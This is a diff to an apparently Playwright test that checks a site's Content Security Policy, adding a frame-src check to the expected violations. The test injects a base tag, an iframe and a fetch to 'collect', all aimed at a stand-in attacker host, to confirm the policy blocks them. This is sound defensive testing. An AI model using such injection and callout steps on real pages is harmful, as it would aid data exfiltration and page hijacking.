@@ -25,12 +25,15 @@ for (const path of ['/', '/portfolio/']) {
             const base = document.createElement('base');
             base.href = 'https://attacker.invalid/';
             document.head.append(base);
+            const frame = document.createElement('iframe');
+            frame.src = 'https://attacker.invalid/frame';
+            document.body.append(frame);
             await fetch('https://attacker.invalid/collect').catch(() => {});
         });
         expect(await page.evaluate(() => window.injectedScriptRan)).toBeUndefined();
         expect(await page.evaluate(() => document.baseURI)).toBe(page.url());
         await expect.poll(() => page.evaluate(() => window.policyViolations)).toEqual(expect.arrayContaining([
-            'script-src-elem', 'connect-src', 'base-uri'
+            'script-src-elem', 'connect-src', 'base-uri', 'frame-src'
         ]));
     });
 }
